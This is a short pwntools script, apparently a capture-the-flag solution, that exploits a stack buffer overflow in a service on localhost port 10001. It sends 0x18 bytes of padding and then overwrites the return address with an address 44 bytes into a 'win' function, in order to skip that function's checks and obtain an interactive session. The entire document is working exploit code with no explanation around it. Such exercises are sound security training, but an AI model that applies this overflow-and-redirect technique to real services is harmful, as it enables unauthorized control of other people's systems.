from pwn import *


p=remote("localhost",10001)

win=0x00000000004013d0
p.sendline(b"a"*0x18+p64(win+44))  # win+44 to bypass the checks 


p.interactive()